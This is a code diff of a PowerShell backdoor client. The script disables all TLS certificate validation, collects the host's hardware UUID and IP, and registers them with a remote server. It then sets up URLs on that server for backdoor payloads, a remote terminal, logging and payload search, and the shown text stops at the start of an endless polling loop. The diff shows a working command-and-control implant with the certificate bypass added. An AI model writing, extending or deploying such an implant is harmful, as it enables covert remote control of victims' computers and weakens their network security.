@@ -1,7 +1,22 @@
-$uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
-# URL NEEDS TO BE CHANGED ONCE DEPLOYED
+add-type @"
+    using System.Net;
+    using System.Security.Cryptography.X509Certificates;
+    public class TrustAllCertsPolicy : ICertificatePolicy {
+        public bool CheckValidationResult(
+            ServicePoint srvPoint, X509Certificate certificate,
+            WebRequest request, int certificateProblem) {
+            return true;
+        }
+    }
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
 
-$register_url = "http://127.0.0.1:8000/api/register/"
+$uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+
+# URL NEEDS TO BE CHANGED ONCE DEPLOYED
+$main_url = "https://ubuntu-pc.mshome.net"
+
+$register_url = $main_url + "/api/register/"
 
 $env:HostIP = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
 
@@ -14,11 +29,11 @@ $Body = @{
 }
 Invoke-RestMethod -Method 'Post' -Uri $register_url -Body $body
 
-$url = "http://127.0.0.1:8000/payloads/backdoor_api/" + $uuid
-$terminal_url = "http://127.0.0.1:8000/payloads/terminal_api/" + $uuid
-$script_log_url = "http://127.0.0.1:8000/api/script_log/"
-$terminal_log_url = "http://127.0.0.1:8000/api/terminal_log/"
-$payload_search_url = "http://127.0.0.1:8000/api/payload/?payload=&payload_name="
+$url = $main_url + "/payloads/backdoor_api/" + $uuid
+$terminal_url = $main_url + "/payloads/terminal_api/" + $uuid
+$script_log_url = $main_url + "/api/script_log/"
+$terminal_log_url = $main_url + "/api/terminal_log/"
+$payload_search_url = $main_url + "/api/payload/?payload=&payload_name="
 
 
 while ($true) {
